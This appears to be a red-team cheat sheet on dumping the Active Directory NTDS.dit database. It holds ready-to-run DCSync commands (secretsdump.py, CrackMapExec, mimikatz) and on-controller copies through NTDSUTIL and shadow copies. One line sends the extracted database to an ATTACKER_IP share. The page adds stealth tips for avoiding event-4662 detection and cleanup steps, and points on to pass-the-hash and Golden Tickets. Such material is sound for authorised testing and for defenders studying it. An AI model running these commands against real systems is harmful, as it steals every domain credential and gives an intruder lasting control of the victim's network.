**Dump NTDS.dit** — `NTDS.dit` is the Active Directory database on every Domain Controller; it holds the NT hashes (and Kerberos keys) of every domain account, including `krbtgt`. Dumping it gives you the whole domain. Do it remotely with replication rights (DCSync), or on a DC you already control by copying the database file.

## Discovery - who can DCSync

DCSync abuses the directory replication rights `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`. Domain Admins have them; so may other principals through delegated ACLs.

**BloodHound:** the edge `DCSync` (or `GetChanges` + `GetChangesAll`) into the Domain node.

**PowerView:**

```powershell

Get-ObjectAcl -DistinguishedName "DC=DOMAIN,DC=LOCAL" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }

```

## Exploitation

### DCSync remotely (secretsdump.py)

No code runs on the DC - you ask it to replicate the secrets to you. Needs an account with the replication rights above (or a forged/high-priv ticket).

```bash

# Whole domain
secretsdump.py 'DOMAIN/USER_NAME:USER_PASS@DC_IP' -just-dc
# NTLM hashes only (skip Kerberos keys / cleartext)
secretsdump.py 'DOMAIN/USER_NAME:USER_PASS@DC_IP' -just-dc-ntlm
# A single account (stealthier - e.g. just krbtgt or one admin)
secretsdump.py 'DOMAIN/USER_NAME:USER_PASS@DC_IP' -just-dc-user 'krbtgt'
secretsdump.py 'DOMAIN/USER_NAME:USER_PASS@DC_IP' -just-dc-user 'Administrator'

```

Authenticate with a hash or a Kerberos ticket instead of a password:

```bash

# Pass-the-hash
secretsdump.py -hashes ':USER_NT_HASH' 'DOMAIN/USER_NAME@DC_IP' -just-dc-user 'krbtgt'
# With a ticket (e.g. a TGT captured via unconstrained delegation, or a forged ticket)
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass 'DOMAIN/DC01$@DC_FQDN' -just-dc

```

**Note:** With Kerberos (`-k`) target the DC by its **FQDN**, not its IP.

### DCSync (CrackMapExec / NetExec)

```bash

cme smb DC_IP -u 'USER_NAME' -p 'USER_PASS' --ntds
cme smb DC_IP -u 'USER_NAME' -H 'USER_NT_HASH' --ntds

```

### DCSync (mimikatz, from Windows)

Run in the context of a user with replication rights:

```powershell

lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt
lsadump::dcsync /domain:DOMAIN /user:DOMAIN\Administrator

```

### On the DC - NTDSUTIL (IFM)

With admin / `SYSTEM` on the DC, create an Install-From-Media snapshot; it bundles `ntds.dit` and the `SYSTEM` hive.

```powershell

ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\ifm" q q

```

Copy the folder off the DC:

```powershell

Copy-Item -Path C:\Temp\ifm -Destination '\\ATTACKER_IP\share' -Recurse

```

The layout:

```console

ifm
├── Active Directory
│   ├── ntds.dit
│   └── ntds.jfm
└── registry
    ├── SECURITY
    └── SYSTEM

```

Decrypt offline:

```bash

secretsdump.py -ntds "ifm/Active Directory/ntds.dit" -system ifm/registry/SYSTEM -security ifm/registry/SECURITY LOCAL

```

### On the DC - Volume Shadow Copy

`ntds.dit` is locked while AD runs; snapshot the volume to copy it.

```cmd

vssadmin create shadow /for=C:
:: note the "Shadow Copy Volume" path returned, e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
reg.exe save HKLM\SYSTEM C:\Temp\system.save

```

Then decrypt offline as above:

```bash

secretsdump.py -ntds ntds.dit -system system.save LOCAL

```

## Post-exploitation

- Crack the dumped NT hashes, see [Windows Password Cracking](Windows%20Password%20Cracking.md).
- Pass-the-hash / use the hashes to run commands, see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).
- The `krbtgt` hash forges Golden Tickets for domain-wide, persistent access.

## Caution

- IFM folders, shadow copies and saved hives are noisy artifacts - remove them and note them in the report.

```cmd

vssadmin delete shadows /for=C: /quiet

```

- DCSync is logged as replication (event `4662`) from a non-DC source - expect detection in monitored environments; prefer `-just-dc-user` for a single account when you only need `krbtgt` or one admin.

## References

- impacket (secretsdump.py) - https://github.com/fortra/impacket
- mimikatz (lsadump::dcsync) - https://github.com/gentilkiwi/mimikatz
- The Hacker Recipes - DCSync - https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
